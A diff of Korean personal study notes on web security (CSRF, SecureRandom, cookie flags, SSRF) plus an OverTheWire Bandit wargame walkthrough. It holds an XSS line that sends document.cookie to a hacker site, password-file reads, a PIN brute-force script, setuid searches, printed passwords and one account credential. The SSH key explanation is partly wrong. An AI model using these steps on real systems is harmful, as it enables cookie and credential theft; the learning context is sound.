@@ -52,7 +52,7 @@ CSRF는
 CSRF는 사용자의 권한을 이용하여 게시물 작성에 <html> ~~<html> 이렇게 작성하는 방법과(기존 form id,value를 분석해서)
 또는 공격자가 만든 사이트 링크를 보내서 공격하는 방법이있다.
 
-GET을 이용한 공격방법(URL방법)
+GET을 이용한 공격방법(URL방법), 그래서 폼작성은 POST로 하는게 좋다.
 A라는 사이트에 비밀번호변경페이지에서 입력란이 NewPassword, Confirm Password만 있을경우 (기존비밀번호는 입력안할때)
 만약에 A라는 사이트의 사용자 비밀번호 변경!!!!을 하는 경우 주소패턴이 abc.com/user.do?cmd=user_passwd_change&user=admin&newPwd=1234
 라고하면 이러한링크를 사용자의 메일로보내서 읽게되면 비밀번호가 바뀐다.(관리자계정으로 로그인되있으면 관리자계정 비밀번호를 바꿀수있다) 
@@ -134,7 +134,7 @@ spotbugs의 플러그인이다. OWASP TOP 10과 CWE를 커버하는 78개의 버
 부적절한 입력탐지, SQL Injection, XSS, 취약한 암호화 알고리즘, 취약한 URL Redirection 등
 
 인터넷에서 https://find-sec-bugs.github.io/download.htm 여기서 plugin(jar파일)을 다운받으면된다.
-
+window - preferences - FindBugs - Security만 체크하고 - plugins and misc 탭에가서 - add로 받은(jar)파일을 넣는다. - 이후 
 
 ------------------------------
 #)PMD(정적분석)
@@ -182,12 +182,347 @@ preferences - PMD - run configuration으로 원하는 분석 체크가능
 -> edinet edinet(계정 비밀번호)
 
 =========================================================================
+#) java.util.Random은 암호학적으로 안전하지 않다. -> SecureRandom을 대신쓴다.
+Random은 진짜난수가 아니라 난수처럼보이는 알고리즘을 통한 규칙적인 난수를 생성하는 것이다.
+이를 해결하기 위해 난수표를 여러개 만들어놓고 매번 다른 난수표를 읽히는 것인데 여기서 난수표를 선택하는 것을 시드라고한다.
+근데, 이 시드값도 동일하면 똑같은 난수가나온다. 그럼 시드가 난수여야하는데?? 그럼 난수가 두개여야하는 문제점발생
+
+random은 시드값으로 시간을 이용한다. 그래서 시간이 같으면 똑같은 난수가 리턴된다. -> 이렇게 예측이 가능하면 보안상문제가생긴다.
+
+그래서 SecurityRandom을 쓴다. -> 예측할수없는 seed를 이용
+
+예제) 난수발생
+
+/**
+	 * 난수발생
+	 * @param inRandomCount
+	 * @return
+	 */
+	public String fnGetGenRandomString(int inRandomCount) {
+
+		//String dummyString = "1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijlmnopqrstuvwxyz"; //
+		
+		String englishLower = "abcdefghijklmnopqrstuvwxyz";
+        String englishUpper = englishLower.toUpperCase();
+        String number = "0123456789";
+		String dataForRandomString = englishLower + englishUpper + number;
+		
+		/*보안조치 random -> SecureRandom   2023-02-21*/
+		//Random ran = new Random();
+		//ran.setSeed(System.currentTimeMillis());
+
+        SecureRandom ran = new SecureRandom();
+        
+		StringBuilder tempBuilder = new StringBuilder(100);
+		int randomInt;
+		char tempChar;
+		for (int loop = 0; loop < inRandomCount; loop++) {
+			randomInt = (ran.nextInt(dataForRandomString.length()) % dataForRandomString.length());
+			tempChar = dataForRandomString.charAt(randomInt);
+			tempBuilder.append(tempChar);
+		}
+
+		return tempBuilder.toString();
+	}
+	
+====================================================================
+import java.security.SecureRandom;
+
+public class RandomGenerator {
+
+	private static SecureRandom random = new SecureRandom();
+
+	/** 랜덤 문자열을 생성한다 **/
+    public static String generate(String DATA, int length) {
+        if (length < 1) throw new IllegalArgumentException("length must be a positive number.");
+        StringBuilder sb = new StringBuilder(length);
+        for (int i = 0; i < length; i++) {
+            sb.append( DATA.charAt(
+            		random.nextInt(DATA.length())
+            		));
+        }
+        return sb.toString();
+    }
+    
+    public static void main(String[] args) {
+    
+    	String ENGLISH_LOWER = "abcdefghijklmnopqrstuvwxyz";
+        String ENGLISH_UPPER = ENGLISH_LOWER.toUpperCase();
+        String NUMBER = "0123456789";
+        
+        /** 랜덤을 생성할 대상 문자열 **/
+        String DATA_FOR_RANDOM_STRING = ENGLISH_LOWER + ENGLISH_UPPER + NUMBER;
+        
+        /** 랜덤 문자열 길이 **/
+        int random_string_length=10;
+    	
+        System.out.println("DATA_FOR_RANDOM_STRING ==> " + DATA_FOR_RANDOM_STRING);
+        for (int i = 0; i < 10; i++) {
+            System.out.println("random " + i + " : " + generate(DATA_FOR_RANDOM_STRING, random_string_length));
+        }
+    }
+}
+
+출력결과: 
+random 0: BjcSvUnm~
+random 1: ~
+random 2: ~ ...      
+============================================================================
+#)MD5는 암호화 결함이 발견되서 SHA를 사용하는것을 권장한다.
+
+#)AES는 암호화,복호화시에 동일한 키를 사용하는 대칭키 알고리즘이다.
+AES-256은 256비트(32바이트)의 키를 사용한다.
+
+#)패딩이란 데이터를 특정크기로 맞추기 위해서 사용되며, 부족한부분의 공간을 의미없는 문자들로 채워서 비트수를 채우는것이다.
+(암호화시에는 반드시 필요하다)
+==============================================================================
+#)Http Only 쿠키 설정
+쿠키는 클라이언트에서 자바스크립트로 조회가능하다. 그래서 해커들은 자바스크립트로 쿠키를 가로챌려고 할 것이다.
+가장 대표적인 방법이 CSS(Cross Site Scripting)이다.
+
+location.href = 'http://해커사이트/?cookies=' + document.cookie;
+
+해커가 위와 같은 게시물을 공개게시판에 작성할 경우, 이 게시물을 읽은 사용자들은 자신의 모든 쿠키를 해커에게 전송한다.
+이러한 취약점을 해결하는 방법은, 바로 브라우저에서 쿠키에 접근할 수 없도록 하는것이다.
+이러한 역할이 HTTP Only Cookie입니다.
+
+#)Secure Cookies
+위에서 처럼 자바스크립트가 아닌 네트워크를 직접 감청하여 쿠키를 가로챌 수도 있다.
+그래서 HTTPS 프로토콜을 사용하여 암호화전송을 하는 것이다.
+개발자의 실수로 HTTPS로 전송되어야 할 것이 HTTP로 전송되는 경우가 많다.
+<img src="http://www.example.com/images/logo.png"/>
+
+이렇게 되면 암호화되지 않은 상태로 쿠키를 서버로 전달하게된다.
+그래서 Set-Cookie: 쿠키명=쿠키값; path=/; secure 를 붙힌다.
+
+===================================================================================
+#)SSRF 공격이란
+SSRF공격은 은행 강도와 같다.
+은행강도는 총과 칼로 직원들을 협박해서 금고에서 돈을 가져오게 시킨다.
+금고 문은 직원만 열수 있기때문이다.
+SSRF도 마찬가지로 내가 원하는대로 서버에게 내가원하는 요청을 보내도록 협박한다면 원하는 데이터는 무엇이든 얻을 수 있다.
+======================================================================================
+무선 AP -> 공유기라고도 한다.
+//노트북이 무선랜카드가 2개이면 2개의 ap에 접속할 수 있다. -> ip2개 받을 수 있다.
+A카페 - 노트북  - B카페
+
+192.168.0.4는 사설ip(내부ip)
+공유기에는 랜선에 꽂혀있는데 외부인터넷세상이다.(즉 외부에서 공유기로 접근할때는 공유기 ap로 접근해서 192로 간다)
+
+구글에다가 myip라고 치면 나오는 ip가 외부에서 나한테 들어오는 ip이다.
+
+--------------------------------------
+ip주소로 컴퓨터까지 찾아가고 포트로 서비스를 구분해서 편지를 가져다준다.
+--------------------------------------
+#)리눅스 명령어 워게임
+mac에서는 > ssh bandit0@bandit.labs.overthewire.org -p 2220
+
+"cat -" 만 치면 반응이없다. 뒤에 옵션이 있어야한다.
+예를들어 파일이름이 "-" 이거면 "cat < - " 파일이 읽힌다. 또는 "cat ./- " 
+
+#)파일이름이 "spaces in this filename" 이면
+cat 'spaces in this filename' 읽으면된다.
+또는 cat spaces\ in\ this\ filename 
+
+#)head에 아무옵션을 넣지 않으면 첫줄부터 10줄까지이다.
+"head ./*" 이렇게 입력하면 현재디렉토리에있는 모든 파일의 내용을 10줄씩 본다.
+
+//결과
+===> ./file00 <==
+파일내용
+===> ./file01 <==
+파일내용
+...
+
+-----------------------------------------
+find ./ -size 1033c  -> c는 바이트이다.
+find / -user bandit7 -group bandit6 -size 33c  -> /로 찾으면 모든파일에대해 검색가능
+find / -user bandit7 -group bandit6 -size 33c 2>/dev/null  하면 에러는 출력안된다.
+------------------------------------------
+grep millionth data.txt -> data.txt파일 내에서 millionth라는 단어찾기
+-------------------------------------------
+#)정렬
+cat 파일이름 | sort  -> 파이프는 왼쪽의 출력결과를 오른쪽의 입력으로 보내주는 연결통로이다.
+
+//data.txt파일에서 중복되지 않은 패스워드가 무엇인지 알 수 있다.
+cat data.txt | sort | uniq -c  -> uniq -c는 중복제거하면서 -c는 몇번 중복됬는지 카운팅이 가능
+
+-----------------------------------------------
+#)data.txt에 패스워드가 저장되어있고, 모든 문자들이 13씩이동되어있다. (즉, rot13으로 복호화해야한다)
+여기서 rot13명령어가 있는데 그전에 카이사르 암호를 알아보자.
+카이사르 암호란 문자열암호화 방식중 하나이다.
+예를들어 apple이라는 문자열을 +3 이라는 키값을 주어서 카이사르암호를 만들면 dssoh가 된다. 3씩이동
+rot13은 암호화와 복호화가 같은 방식이기 때문에 특별히 이름을 지어준것이다.
+알파벳은 총 26개이기때문에 ROT13으로 암호화를 두번하면 원래의 문자+26이 되서 문자열에 변함이 없기때문이다.
+
+#)지정한 문자열을 바꾸어주는 명령어 tr이 있다.
+tr [대상문자] [바꿀문자]
+//즉, 대소문자모두 A~M(13문자)문자는 N~Z(13문자)로, N~Z는 A~M으로 바꾸는 명령어이다.
+cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'  
+
+-------------------------------------------------------------
+#)헥사코드 파일을 test.txt라고 하자
+xxd 파일이름 : 해당 파일을 헥사코드로 바꾼다.
+xxd -r 파일이름 : 헥사코드로 이루어진 파일을 원래의 파일로 되돌린다.
+
+xxd -r test.txt > text2.txt
+file text2.txt라고 치면 data2.bin이라는 파일을 gzip압축을 이용해 압축한 파일이라고 나온다.
+
+gzip은 리눅스에서 제공하는 압축 기법중 하나이다.
+gzip 파일이름: 해당 파일을 gzip방식으로 압축
+gzip -d 파일이름 : .gz 파일을 압축해제한다.
+
+tar는 여러개의 파일을 하나로 합쳐놓은것이다. 
+리눅스에서는 압축할 떈 하나의 파일만 압축할 수 있기때문에 여러 파일을 한번에 압축할 땐 tar명령어를 이용해서
+여러개의 파일을 하나로 합친 후에 tar파일을 압축한다. 그래서, tar.gz 형식을 많이 볼수있다.
+
+tar cvf 새이름 파일1 파일2 ... : 파일들을 하나로 합친다.
+tar xvf 합친이름 : 하나로 합친것을 각각의 파일로 나누어준다.
+=======================================================================
+#) ssh key란
+ssh-key gen으로 생성을 하면 public, private가 생기는데
+비공개키는 로컬에 위치하고, 공개키는 원격지에 위치한다. 
+ssh접속을 시도하면 로컬의 비공개키와 원격서버의 비공개키를 비교해서 일치하는지 인증과정을 거친다.
+
+예를들어 pem이라는 파일을 받게되는데 이게 비공개키고 이걸 다운받는다. 그래서 이 파일은 잃어버리면 복구가 불가능
+백업해놔야한다.
+
+ssh -i sshkey.private bandit14@localhost -p 2220 으로 접속가능 (bandit14 권한으로)
+==================================================================================
+#)openssl명령어
+s_client는 openssl명령으로 운영중인 웹서버의 SSL인증서 정보를 살펴볼 수 있다.
+SSL/TLS를 사용하는 원격 호스트에 접속하기 위한 명령어이다.
+
+> openssl s_client -connect daum.net:443
+=> SSL인증서가 정상적으로 적용되어있는 시스템과 통신하면 인증서의 정보가 나열되며 프로토콜이 TLS1.0, TLS.1.1은 더이상 브라우저가 지원하지 않을 예정이므로
+TLS1.2이상인지 확인하는데 유용하다.
+
+SSL인증서를 사용하지않으면 no peer certification ~
+통신이 되지 않는경우(방화벽차단 또는 잘못입력 시)는 socket: Bad file descriptor
+
+==================================================================================
+#)두 파일비교 diff
+diff password.old passwords.new
+결과: 
+42c42    //42번째 줄에
+< 1234   //password.old의 42번줄
+---
+> 2345   //password.new의 42번줄
+
+===================================================================================
+.bashrc는 로그인할때 실행되는 스크립트이다. 그렇기 때문에 이걸 수정해서 로그인해서 접속하자마자 팅기게 할 수도 있다.
+그래서 문제에는 "bandit18의 홈디렉토리에 readme파일이 있는데 거기에 패스워드가 있으니 그걸써라" 
+> ssh bandit18@bandit.labs.overthewire.org -p 2220 "cat readme"
+
+=====================================================================================
+#) cron : 자동으로 실행되는 시간 기반의 작업 스케쥴러 /etc/cron.d
+@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null    -> 부팅할때 스크립트(출력,에러) 휴지통으로(&> 의 의미는 stdout(1), stderr(2)를 /dev/null로 리다이렉트한다는 의미)
+* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null  -> 매시매분 휴지통으로
+
+=====================================================================================
+#)쉘 스크립트
+#!/bin/bash
+
+myname=$(whoami)  # bandit23파일이기 때문에 myname 변수에 bandit23을 저장
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)  # I am user bandit23을 md5해시로 변환시키고
+                                                                구분자를 ' '로 지정 후 첫 번째 필드를 mytarget 변수에 저장
+
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"  # 해당 내용을 출력
+
+cat /etc/bandit_pass/$myname > /tmp/$mytarget  # /etc/bandit_pass/$myname의 파일의 내용을 tmp/$mytarget에 23의 password가 저장
+
+====================================================================================
+#!/bin/bash  #bin/bash 셸을 사용
+
+myname=$(whoami)  # myname 변수에 bandit24를 저장
+
+cd /var/spool/$myname/foo  # /var/spool/bandit24/foo에 들어감
+echo "Executing and deleting all scripts in /var/spool/$myname/foo:"  # 해당 내용을 출력
+for i in * .*;  # 현재 디렉토리 내 모든 파일에 대해서 반복 
+do
+    if [ "$i" != "." -a "$i" != ".." ];  # 만약 이름이 .이 아니고 ..이 아니라면
+    then
+        echo "Handling $i"  # 해당 내용을 출력
+        owner="$(stat --format "%U" ./$i)"  # owner 변수에 현재 검사 중인 파일의 소유자명을 저장
+        if [ "${owner}" = "bandit23" ]; then  # 만약 소유자가 bandit23이라면
+            timeout -s 9 60 ./$i  #  60초 후 프로그램을 종료시킨다.
+        fi  # if문이 종료됐다는 걸 알림
+        rm -f ./$i  # 해당 파일을 강제로 삭제
+    fi  # if문 종료
+done  # for문 마무리
+
+//한마디로 /var/spool/bandit24/foo 의 스크립트가 60초마다 삭제된다는 뜻이다.
+
+=====================================================================================
+#) nc localhost 30002  : localhost의 30002포트에 접속
 
 
+#!bin/bash  # bash 셸 실행
 
 
+for i in {0..9999}  # 0부터 9999까지 반복
+do  # for문 시작
+        echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i" >> /tmp/pincode/clist.txt  # [bandit24password] [0~9999까지 pincode]                                                                                                                                       형식으로 /tmp/pin/clist.txt에 저장
+done  # 끝
 
- 
+// clist.txt에 내용은
+VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 1
+VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar 2
+...
+
+
+------------------------
+> cat clist.txt | nc localhost 30002  //이렇게 파이프라인을 통해 접속가능
+> cat clist.txt | nc localhost 30002 > ./result  //이렇게 접속결과를 파일로 볼수있다.
+> sort result | uniq -c result  //정렬, 중복 제거
+
+=======================================================================================
+//현재 경로에 bandit26.sshkey(private key)파일이있는데 이걸로 접속
+ssh -i bandit26.sshkey bandit26@localhost -p 2220
+
+//사용자의 간단한 정보가 들어있는 /etc/passwd를 보면 마지막 필드가 로그인할 때 처음으로 실행되게할 프로그램을 말한다.
+bandit26:x:~~~...:/usr/bin/showtext  
+
+그래서 showtext를 보니까
+
+#!/bin/sh
+export TERM=linux
+more ~/text.txt
+exit 0
+
+> more text.txt로 본다음에 v를 치면 vi모드로 들어가고
+:e /etc/bandit_pass/bandit26을 치면 text.txt 편집모드에서 /etc/bandit_pass/bandit26파일을 편집할수있게된다.
+wq로 저장하면 처음열었던 text.txt파일 편집모드로 들어가게된다.
+
+=============================================================================
+//setuid 란
+파일실행 시 파일 소유자의 권한으로 실행하는 것을 의미
+예) rwsr--r-- 
+passwd 같은 명령어는 /etc/passwd로 접근해서 비밀번호를 변경하는 명령어이다.
+하지만 passwd권한은 -rw-r--r--로 주어지는데 즉, root만이 비밀번호를 바꿀 수 있다는 뜻이다.
+다르게 말하면 자신의 비밀번호를 바꿀때에도 root에게 매번 허락을 받아야 한다는 뜻이다.
+/etc/passwd 파일은 root만 권한을 갖고있어서 권한이 없기때문에
+이런것을 방지하기 위해 setuid로 지정하여 비밀번호를 바꿀때만 root권한을 부여받게 된다.
+그러면 /etc/passwd에 쓸수있다는 것이다.
+
+chmod 4755 [파일이름] 이렇게 준다.
+
+//setuid 설정된 파일 찾기
+> find / -user root -perm -4000
+
+===========================================================================
+#)git clone ssh://bandit27-git@localhost/home/bandit27-git/repo 
+-> bandit27-git(ip)의 해당경로의 repo폴더를 clone하겠다. (현재경로에)
+
+이렇게되면 repo폴더안에 .git, README 가 있는게 보인다.
+============================================================================
+> git log
+> git show [commit번호] 
+수정사항이 보인다. 
+// + 부분이 수정한부분이다.
+-- password: bbc96594b4e001778eee9975372716b2
++- password: xxxxxxxxxx 
+=============================================================================
 
 
  
